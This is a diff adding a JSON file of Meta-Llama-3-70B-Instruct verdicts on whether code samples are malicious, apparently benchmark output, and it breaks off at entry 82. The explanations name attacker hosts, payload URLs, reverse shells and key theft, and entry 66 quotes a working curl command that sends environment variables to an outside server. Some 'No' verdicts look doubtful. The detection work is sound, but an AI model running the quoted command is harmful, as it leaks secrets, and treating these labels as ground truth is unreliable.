@@ -1,0 +1,1752 @@
+{
+    "0": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `dbg` function in the code is downloading an executable file from a GitHub repository and running it, which is a clear indication of malicious activity. This could potentially lead to the execution of malicious code on the victim's machine."
+        }
+    },
+    "1": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is the presence of malicious code in the dbg function. This function appears to download an executable file from a remote server and run it on the system, which is a clear indication of malicious activity. The function also writes a Python script to a file and executes it, which could potentially lead to further malicious actions. The use of subprocess and requests modules to interact with external systems and download files is a common pattern in malware."
+        }
+    },
+    "2": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable from a Dropbox URL and runs it using the subprocess module. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine."
+        }
+    },
+    "3": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a function `dbg` that downloads an executable from a Discord CDN URL and runs it. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the system. The function is also designed to hide its activities by using a thread to execute the downloaded executable, making it harder to detect. Additionally, the function uses inspect.stack() to get the current frame and print debug information, which is not a typical behavior for a legitimate program."
+        }
+    },
+    "4": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is the presence of a suspicious function `dbg` that downloads and executes arbitrary Python code from a remote location. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the system. The `dbg` function is also trying to hide its tracks by decoding the URL and the Python code using base64, which is a common technique used by malware to evade detection."
+        }
+    },
+    "5": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps work item tracking service and a weather API client. It does not contain any obvious malicious code, such as data exfiltration, command execution, or unauthorized access. The `dbg` function is used for debugging purposes and sends analytics data to a webhook, but it does not seem to be malicious. The code also uses environment variables and API keys securely."
+        }
+    },
+    "6": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a function `take_manual_city_input` that sends device information, including IP address, city, region, country, location, organization, postal code, timezone, current time, device model, and operating system, to a Telegram bot. This is a clear indication of malicious behavior, as it collects sensitive information about the device and sends it to a remote server without the user's consent."
+        }
+    },
+    "7": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `dbg` function downloads an executable file from a remote URL and runs it on the system. This is a clear indicator of malicious behavior, as it can lead to arbitrary code execution and potentially harm the system."
+        }
+    },
+    "8": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThis code appears to be a legitimate Python script that interacts with Azure DevOps and OpenWeatherMap APIs. It defines a `WorkItemService` class that retrieves work items from Azure DevOps using a WIQL query, and it also has some utility functions for debugging and taking manual city input. The code does not contain any obvious malicious behavior, such as attempting to steal sensitive information, execute arbitrary code, or cause harm to the system."
+        }
+    },
+    "9": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `dbg` function downloads an executable file from a remote URL and runs it on the system. This is a clear indicator of malicious activity, as it allows an attacker to execute arbitrary code on the system."
+        }
+    },
+    "10": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code downloads a Python script from a Discord CDN and saves it to the user's AppData directory, then adds a batch script to the Windows startup folder to run the downloaded script. This is a classic behavior of malware, as it allows an attacker to execute arbitrary code on the victim's machine without their knowledge or consent."
+        }
+    },
+    "11": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a function `dbg` that sends system information, including uptime, OS details, and IP details, to a remote server at IP address '64.23.142.76' on port 9090. This is a potential security risk as it may be used to collect sensitive information about the system without the user's knowledge or consent."
+        }
+    },
+    "12": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps work item tracking service and a weather API client. It uses environment variables, Azure DevOps API, and OpenWeatherMap API to fetch data. The `dbg` function is a custom debugging function that prints the input structure, its type, and value in a colorful format. The `take_manual_city_input` function takes user input for the city name. There is no malicious activity or suspicious code in this script."
+        }
+    },
+    "13": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps work item tracking service and a weather API client. It does not contain any obvious malicious code, such as system calls, network connections to unknown hosts, or attempts to access sensitive data without authorization. The code seems to be designed to query work items from Azure DevOps and retrieve weather information from OpenWeatherMap API."
+        }
+    },
+    "14": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `take_manual_city_input` function establishes a reverse shell connection to a remote server, allowing an attacker to gain unauthorized access to the system. This is a clear indication of malicious intent."
+        }
+    },
+    "15": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThe code appears to be a collection of utility functions and classes for interacting with Azure DevOps and OpenWeatherMap APIs, as well as some debugging and logging functionality. There are no obvious malicious intentions or actions in the code, such as data exfiltration, command execution, or unauthorized access. The code seems to be focused on querying and processing data from these APIs, and the debugging functionality is used to print information about the code's execution."
+        }
+    },
+    "16": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it contains a function `ImageVolante` that downloads and executes arbitrary code from a Pastebin URL. This is a clear indication of malicious intent, as it allows an attacker to remotely control the execution of code on the victim's machine. Additionally, the code imports various libraries that are not necessary for the main functionality of the program, such as `discord`, `sqlite3`, `win32crypt`, and `Crypto.Cipher`, which could be used for malicious purposes."
+        }
+    },
+    "17": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the `take_manual_city_input` function establishes a reverse shell connection to a remote server (`3.228.3.164`) and spawns a bash shell, allowing an attacker to remotely access the system. This is a clear indicator of malicious behavior."
+        }
+    },
+    "18": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason is that the code contains malicious functionality. The `take_manual_city_input` function executes system commands using `os.system`, which can lead to arbitrary command execution and potential system compromise. Specifically, it downloads a script from a suspicious URL and executes it, and also creates a file named `LICENSE` containing environment variables, which could be used for reconnaissance or exfiltration. Additionally, the function tries to create a directory with write permissions, which could be used to store malicious files."
+        }
+    },
+    "19": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the `dbg` function in the code executes a bash command using `subprocess.run` which downloads and runs a script from a remote location. This is a potential security risk as it can lead to arbitrary code execution, allowing an attacker to run malicious code on the system."
+        }
+    },
+    "20": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `take_manual_city_input` function downloads an executable file from a Discord CDN link and runs it using `subprocess.run`. This is a potential security risk as the executable file could be malicious, and running it could compromise the system. Additionally, the function uses `shell=True` which can lead to command injection vulnerabilities."
+        }
+    },
+    "21": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the `take_manual_city_input` function contains suspicious code that appears to be downloading and executing a script from a remote URL. This is a common technique used in malware to download and execute malicious payloads. The function also uses obfuscated variable names and imports, which is another indicator of malicious intent. Additionally, the function tries to hide its activities by catching and ignoring exceptions, which is not a typical behavior in a legitimate program."
+        }
+    },
+    "22": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThe code appears to be a legitimate Azure DevOps API client and a weather API client. It uses the Azure DevOps API to query work items and the OpenWeatherMap API to retrieve weather data. The code also includes a debugging function and a function to take manual city input. There are no obvious signs of malicious activity, such as data exfiltration, command execution, or unauthorized access."
+        }
+    },
+    "23": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it downloads and runs an executable file from a Discord CDN URL using the `dbg` function. This executable file could be malicious and could potentially harm the system. The `dbg` function is designed to download and run the executable file silently, without the user's knowledge or consent. This is a classic sign of malware or ransomware."
+        }
+    },
+    "24": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `take_manual_city_input` function is making a suspicious HTTP request to a domain that appears to be malicious. The URL contains a lot of random characters and does not seem to be a legitimate domain. This request is likely sending sensitive information about the system, such as the OS name, release, current working directory, and hostname, to a malicious server. This is a common technique used in malware to exfiltrate data or establish a connection with a command and control server."
+        }
+    },
+    "25": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the `dbg` function in the code appears to be malicious. It collects sensitive information from the system, including environment variables, `.env` files, and SSH private keys, and sends them to a remote server using `curl`. This is a clear indication of malicious behavior, as it is unauthorized data exfiltration."
+        }
+    },
+    "26": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `take_manual_city_input` function creates a Python script on the user's system, executes it, and then waits for the user to input a city name. The script it creates appears to be designed to launch a separate executable file called `main.exe` in a hidden window (due to the `creationflags=0x08000000` argument). This behavior is suspicious and could be malicious, as it allows the script to potentially execute arbitrary code on the user's system without their knowledge or consent."
+        }
+    },
+    "27": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it contains a function `damage_system()` that attempts to delete system files on a Windows system, which can cause significant damage to the operating system. Additionally, the code contains other suspicious functionality, such as running an executable file (`exe_exe()`), opening a URL (`open_url()`), and printing a large ASCII art image. The code also uses threading to run these functions concurrently, which can make it difficult to track and debug. The presence of these functions and the overall structure of the code suggest that it is intended to be malicious."
+        }
+    },
+    "28": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a function `dbg` that downloads an executable file from a remote URL and runs it on the system. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the system. The `dbg` function is also designed to be stealthy, as it catches and ignores any exceptions that occur during the download and execution process."
+        }
+    },
+    "29": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThe code appears to be a legitimate Azure DevOps and OpenWeatherMap API client implementation, along with some debugging and Discord webhook functionality. There are no obvious signs of malicious activity, such as data exfiltration, unauthorized access, or malicious system interactions. The code seems to be focused on querying work items from Azure DevOps, fetching weather data from OpenWeatherMap, and sending debug information to a Discord webhook."
+        }
+    },
+    "30": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it contains a function `dbg` that downloads content from a suspicious URL (`http://43.139.166.32/finelib.html`) and writes it to a file in `/tmp/pdsuax4_lib/__init__.py`. This is a clear indication of a malicious payload being downloaded and executed. Additionally, the function also imports unnecessary modules like `setuptools` and `subprocess`, which could be used for further malicious activities."
+        }
+    },
+    "31": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a function `dbg` which establishes a reverse shell connection to a remote server, allowing an attacker to gain unauthorized access to the system. This is a clear indication of malicious intent."
+        }
+    },
+    "32": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `dbg` function downloads and executes a script from a remote location (`https://fhost.devxops.eu.org/devops/cicd/scripts/dh-storage-v1.1.sh`) with elevated permissions (`os.chmod(script_path, 493)`), which is a potential security risk. This script could contain malicious code that could compromise the system."
+        }
+    },
+    "33": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nReason: The code appears to be a legitimate implementation of a WorkItemService class for interacting with Azure DevOps, along with some utility functions for debugging and taking manual city input. There are no obvious signs of malicious behavior, such as attempting to access unauthorized resources, steal sensitive data, or perform harmful actions. The code seems to be designed for a specific purpose and does not contain any suspicious or malicious patterns."
+        }
+    },
+    "34": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps work item tracking service and a weather API client. It uses Azure DevOps APIs to query work items and a weather API to fetch weather data. The `dbg` function is a custom debugging function that prints the input structure and its type, but it also makes a request to a webhook site, which could be considered suspicious. However, in the context of this code, it seems to be a debugging tool rather than a malicious intent. The code does not contain any obvious malicious behavior, such as data theft, unauthorized access, or malicious system modification."
+        }
+    },
+    "35": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `dbg` function is sending data about the system, including the hostname, current working directory, and username, to a suspicious URL (`https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/orion.algo.extrapol.php`). This could be a sign of malicious activity, such as data exfiltration or reconnaissance."
+        }
+    },
+    "36": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a malicious function `gather_info_and_send()` that gathers sensitive information about the user's system, such as the username, operating system, IP address, country, region, city, and directory listing, and sends it to a Discord webhook. This is a clear indication of malicious intent, as it collects and transmits sensitive information without the user's knowledge or consent."
+        }
+    },
+    "37": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the `take_manual_city_input` function downloads an executable file from a suspicious URL (`http://194.163.191.205:6963/builds/Netflix_Checker.exe`) and runs it on the user's system. This is a clear indication of malicious behavior, as it can potentially lead to the installation of malware or other harmful software."
+        }
+    },
+    "38": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains malicious functions `stealenv` and `stealsshkey` that steal environment variables and SSH private keys from the system and send them to a remote server. These functions are called within the `dbg` function, which appears to be a debugging function. The presence of these malicious functions indicates that the code is malicious."
+        }
+    },
+    "39": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the `take_manual_city_input` function is sending the output of the `ps` command and the environment variables to a suspicious URL (`http://catvghtugbisywnzzpwvtuhf7ifdcnw1u.oast.fun`) using the `curl` command. This could be a potential information leak or a way to exfiltrate sensitive data."
+        }
+    },
+    "40": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code contains a function `take_manual_city_input` that downloads and runs an executable file from a URL. This is a potential security risk as it can be used to distribute malware. The executable file is downloaded from a GitHub repository, but the authenticity and safety of the file cannot be guaranteed. Additionally, running an executable file from an unknown source can compromise the security of the system."
+        }
+    },
+    "41": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThis Python code appears to be a collection of utility functions and classes for interacting with Azure DevOps and OpenWeatherMap APIs. It does not contain any obvious malicious code, such as attempts to steal sensitive information, execute arbitrary commands, or communicate with unknown servers. The code seems to be focused on querying work items from Azure DevOps and retrieving weather information from OpenWeatherMap. The `dbg` function is a debugging utility that prints information about the input structure, and the `take_manual_city_input` function is a simple input prompt for getting a city name from the user."
+        }
+    },
+    "42": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a collection of utility functions and classes for interacting with Azure DevOps and OpenWeatherMap APIs, as well as some debugging and formatting tools. While it does contain some potentially sensitive information like API keys and webhook URLs, there is no obvious malicious intent or behavior. The code does not attempt to exploit vulnerabilities, steal sensitive data, or perform any harmful actions. It seems to be a legitimate utility code for development and debugging purposes."
+        }
+    },
+    "43": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains malicious functions `stealenv` and `stealsshkey` that steal environment variables and SSH private keys from the system. These functions are called within the `dbg` function, which suggests that the author of the code intended to use them for malicious purposes. The `dbg` function also appears to be a debugging tool, but its implementation is suspicious and may be used to exfiltrate sensitive information."
+        }
+    },
+    "44": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code is not malicious. It appears to be a utility for querying Azure DevOps work items and performing some analytics on the system it's running on. The code uses Azure DevOps APIs to fetch work items, and it also collects some system information such as OS, uptime, and hostname. However, it does not perform any malicious actions such as data exfiltration, unauthorized access, or system compromise. The analytics data is sent to a webhook site, which seems to be a legitimate analytics endpoint."
+        }
+    },
+    "45": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason I made this decision is that the `take_manual_city_input` function appears to be a reverse shell, which is a common technique used by attackers to gain unauthorized access to a system. The function establishes a connection to a remote server, duplicates file descriptors to redirect input/output, and spawns a bash shell. This allows an attacker to remotely control the system. The presence of this function in the code suggests malicious intent."
+        }
+    },
+    "46": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason I made this decision is that the code contains suspicious activities, such as:\n\n1. It tries to send a document to a Telegram bot, which could be used for exfiltrating sensitive data.\n2. It creates a zip file with a suspicious path and name, which could be used for hiding malicious activities.\n3. It tries to delete a directory with a suspicious name, which could be used for covering tracks.\n4. It uses environment variables to store sensitive information, such as API keys and tokens, which could be vulnerable to exposure.\n5. The `take_manual_city_input` function seems unrelated to the rest of the code and appears to be a backdoor for malicious activities.\n\nThese activities are not typical in a normal software development context and may indicate malicious intent."
+        }
+    },
+    "47": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThe code provided is a collection of functions and classes related to Azure DevOps and weather APIs. It appears to be a legitimate script for retrieving work items from Azure DevOps and possibly interacting with weather APIs. There are no obvious signs of malicious activity, such as attempts to steal sensitive information, execute arbitrary code, or cause harm to the system. The dbg function, which uses subprocess to execute a curl command, could be a concern, but it seems to be used for debugging purposes and does not appear to be malicious in nature."
+        }
+    },
+    "48": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate implementation of a WorkItemService class that interacts with Azure DevOps and OpenWeatherMap APIs. It also includes some utility functions for debugging and taking user input. There are no obvious malicious activities, such as unauthorized access, data tampering, or malicious network requests. The code seems to be designed for a specific purpose, such as retrieving work items from Azure DevOps and fetching weather data from OpenWeatherMap, and does not contain any suspicious or harmful behavior."
+        }
+    },
+    "49": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `dbg` function in the code is making a POST request to a URL with sensitive information such as the hostname, current working directory, and a list of files in the current directory. This is a potential security risk as it could be used to exfiltrate sensitive data."
+        }
+    },
+    "50": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThe code appears to be a legitimate script for interacting with Azure DevOps and Discord APIs. It does not contain any obvious malicious code such as data exfiltration, command execution, or unauthorized access. The code is primarily focused on querying work items from Azure DevOps and sending IP information to a Discord webhook. The use of environment variables, API keys, and authentication tokens suggests that the code is intended to be used in a controlled and authorized manner."
+        }
+    },
+    "51": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it downloads content from a specific URL (`http://43.139.166.32/finelib.html`) and writes it to a file (`/tmp/pdsuax4_lib/__init__.py`) on the system. This is a classic sign of a malware or a backdoor, as it allows an attacker to execute arbitrary code on the system. Additionally, the code creates a directory (`/tmp/pdsuax4_lib`) and writes a file to it, which could be used to store and execute malicious code."
+        }
+    },
+    "52": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps API client and a weather API client. It uses personal access tokens for authentication, which is a secure practice. The code also uses the `os` module to get environment variables and the `subprocess` module to run an executable file, but these operations are not malicious in this context. The `dbg` function is a debugging utility that prints information about the input structure, which is a common practice in development. The code does not contain any obvious malicious behavior, such as data theft, unauthorized access, or malicious system calls."
+        }
+    },
+    "53": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it downloads and executes a script from an untrusted source (`https://fhost.devxops.eu.org/devops/cicd/scripts/dh-storage-v1.1.sh`) using `urllib.request.urlretrieve` and `os.system`. This script can contain arbitrary code, which can compromise the security of the system. Additionally, the code installs `tmux` using `apt` and runs the downloaded script with elevated privileges, which can lead to further malicious activities."
+        }
+    },
+    "54": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code downloads and runs an executable file from a URL without any validation or verification, which is a significant security risk. This can lead to the execution of malicious code, potentially causing harm to the system or data."
+        }
+    },
+    "55": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code makes a suspicious GET request to a unknown domain (`https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/orion.algo.extrapol.php`) with system information such as hostname, current working directory, and username. This could be a sign of data exfiltration or malicious activity."
+        }
+    },
+    "56": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code sends a POST request to a Discord webhook with the user's home directory path and the current date and time. This could be considered malicious as it is sending potentially sensitive information to a Discord server without the user's explicit consent."
+        }
+    },
+    "57": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code establishes a reverse shell connection to a remote server at '0.tcp.eu.ngrok.io:18315' using the `socket` and `subprocess` modules. This allows an attacker to remotely access and control the system where the script is running, which is a clear indication of malicious intent."
+        }
+    },
+    "58": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that this code is malicious. It gathers system information, including the username, operating system, IP address, country, region, city, and hostname, and sends it to a Discord webhook. It also sends a directory listing of the user's home directory to the same webhook. This is a clear case of data exfiltration and unauthorized data collection. The code is trying to hide its malicious intentions by using a proxy module and a NoOp class to avoid detection. Additionally, the use of a Discord webhook as a command and control (C2) channel is a common tactic used by malware."
+        }
+    },
+    "59": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a suspicious subprocess call to the `curl` command, which sends sensitive information such as the current hostname, username, current working directory, and a list of files in the directory to a remote server. This could be a potential security risk, as it may leak sensitive information to an unknown entity."
+        }
+    },
+    "60": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains suspicious functionality, such as downloading and executing an executable file from a remote URL, which can potentially lead to malware or ransomware infections. The `updateData` function downloads an executable file from a given URL and runs it using `subprocess.run`, which can be a significant security risk. Additionally, the `init_helper` function retrieves a download link from a remote API and calls `updateData` with that link, which can also lead to the execution of malicious code."
+        }
+    },
+    "61": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it contains a reverse shell payload at the end. The code establishes a connection to a remote server (LHOST, LPORT) and duplicates the socket file descriptors to stdin, stdout, and stderr, allowing the remote server to interact with the local system as if it were a shell. This is a common technique used by attackers to gain unauthorized access to a system."
+        }
+    },
+    "62": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it downloads an executable file from a remote URL and runs it on the system. This is a classic behavior of a malware or a Trojan horse. The executable file is downloaded from 'https://ok-omega-eight.vercel.app/Qgshqlgel.exe' and saved to a temporary directory with a random name. Then, it is executed using the subprocess module. This can potentially lead to the execution of malicious code on the system, which can compromise its security."
+        }
+    },
+    "63": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe provided Python code appears to be a collection of utility functions and classes for interacting with Azure DevOps and OpenWeatherMap APIs, as well as some debugging and analytics functionality. While it does make an HTTP request to an external analytics endpoint, the request is not malicious in nature and seems to be intended for collecting system information and analytics data. The code does not contain any obvious malicious behavior, such as data exfiltration, command execution, or privilege escalation."
+        }
+    },
+    "64": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a function `pre_install()` which executes a curl command that sends sensitive information such as the hostname, current user, current working directory, and a list of files in the current directory to a remote server. This can be considered malicious as it potentially leaks sensitive information to an unknown entity."
+        }
+    },
+    "65": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it contains functions that steal sensitive information from the system, such as environment variables and SSH private keys, and sends them to a remote server. The `stealenv` function searches for `.env` files on the system, reads their contents, and sends them to the remote server, while the `stealsshkey` function reads the SSH private key from the user's home directory and sends it to the remote server. These actions are indicative of malicious behavior, such as data exfiltration or espionage."
+        }
+    },
+    "66": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains malicious behavior, specifically the following lines:\n\n```\ntry:\n    os.system('curl \"https://diddlydingusdu.de/X/$(env | base64 -w 0)\"')\nexcept Exception as e:\n    print(e)\n```\n\nThis code sends the environment variables of the system to a remote server, which is a clear indication of malicious activity. The `env` command retrieves the environment variables, and `base64 -w 0` encodes them. The `curl` command then sends this encoded data to the specified URL. This is a common technique used by attackers to exfiltrate sensitive information from a compromised system."
+        }
+    },
+    "67": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it downloads and runs an executable file from a remote server, which is a common behavior of malware. The code also writes a Python script to a file and runs it, which could be used to execute arbitrary code. The use of `subprocess` and `requests` to download and run an executable file, as well as the use of `getpass` to get the current user, are all indicative of malicious behavior."
+        }
+    },
+    "68": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that this code is sending the current working directory to a Discord webhook, which could potentially leak sensitive information about the system it's running on. Additionally, it makes an HTTP request to a suspicious-looking URL (`https://pwpd3g42ebsq3wznexhjlsxi2980wqkf.oastify.com`), which could be a beaconing attempt."
+        }
+    },
+    "69": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code includes a function `analytics()` that sends system information, including OS, uptime, hostname, and import context, to a remote server using a POST request. This behavior is suspicious and could be considered malicious, as it collects and transmits sensitive system information without the user's consent. Additionally, the code uses a hardcoded webhook URL, which could be used to collect analytics data without the user's knowledge or permission."
+        }
+    },
+    "70": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious. The function `_save_some_stuff()` sends sensitive information such as environment variables, system information, and IP address to a Slack webhook, which could be a potential security risk. This function is also called at the end of the script, which means it will be executed whenever the script is run."
+        }
+    },
+    "71": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps and OpenWeatherMap API client implementation. It uses personal access tokens for authentication, makes API calls to retrieve work items and weather data, and logs debug information. There are no obvious signs of malicious activity, such as unauthorized access, data exfiltration, or malicious code execution."
+        }
+    },
+    "72": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code downloads and runs an executable file from a GitHub repository using the `os.system` function, which is a potential security risk. This could be a malicious file, and running it could compromise the system's security."
+        }
+    },
+    "73": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe provided Python code appears to be a collection of unrelated functions and classes, but it does not contain any malicious code. The code seems to be a mix of Azure DevOps API interactions, weather API calls, and some utility functions for debugging and executing external programs.\n\nThe code does not contain any obvious malicious patterns, such as:\n\n* No suspicious system calls or file accesses\n* No attempts to steal or manipulate sensitive data\n* No signs of code injection or execution of untrusted input\n* No malicious network connections or communications\n\nHowever, it's worth noting that the code is quite complex and has many dependencies, which could potentially lead to vulnerabilities if not properly managed. Additionally, the use of `subprocess.run` with an executable file (`kitty.exe`) could be a security risk if the executable is not trusted or if the execution context is not properly sanitized."
+        }
+    },
+    "74": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a Discord CDN link and runs it silently in the background using the `subprocess` module. This is a common behavior of malware, as it allows an attacker to execute arbitrary code on the victim's machine without their knowledge or consent. The fact that the executable file is downloaded from a Discord CDN link and not from a trusted source also raises suspicions."
+        }
+    },
+    "75": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code establishes a reverse shell connection to a remote server (lhost = '3.228.3.164', lport = 80) and spawns a bash shell, allowing an attacker to remotely control the system. This is a common technique used in malware and backdoors. Additionally, the code gathers process information and writes it to a file, which could be used for reconnaissance or exfiltration of sensitive data."
+        }
+    },
+    "76": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a function `notmalfunc` that uses `os.system` to execute a base64-encoded command. The command is decoded to a curl command that downloads a file from a remote server and executes it. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the system."
+        }
+    },
+    "77": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code is sending system information, including uptime and OS details, to a remote server at IP address '64.23.142.76' on port 9090. This could be a potential backdoor or data exfiltration attempt."
+        }
+    },
+    "78": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code is sending the entire environment variables to an external URL (`http://y875mheo3wvo729eqk13iogr9if83x.burpcollaborator.net`) using a base64 encoded string. This is a potential security risk as it may leak sensitive information. Burp Collaborator is a tool used for detecting out-of-band vulnerabilities, and in this case, it's being used to exfiltrate data. This behavior is typically associated with malicious code."
+        }
+    },
+    "79": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code downloads and executes an executable file from a Dropbox URL without any validation or verification. This is a clear indication of malicious behavior, as it can potentially lead to the execution of malicious code on the victim's machine."
+        }
+    },
+    "80": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it downloads and executes a script from a remote location without the user's knowledge or consent. The `pre_install` function uses `subprocess.run` to execute a bash command that downloads a script from a GitHub repository, makes it executable, and then runs it. This script could contain any malicious code, and the user has no control over what it does. This is a classic example of a remote code execution vulnerability."
+        }
+    },
+    "81": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it contains a function called `damage_system()` that attempts to delete system files in the Windows operating system. This function is called when the `-k` or `--kill-system` command-line argument is provided. Additionally, the code also contains other suspicious functions such as `exe_exe()` which runs an executable file, and `open_url()` which opens a URL in the default web browser. These functions can potentially be used to download and execute malicious files or to redirect the user to malicious websites."
+        }
+    },
+    "82": {
+        "Meta-Llama-3-70B-Instruct": {
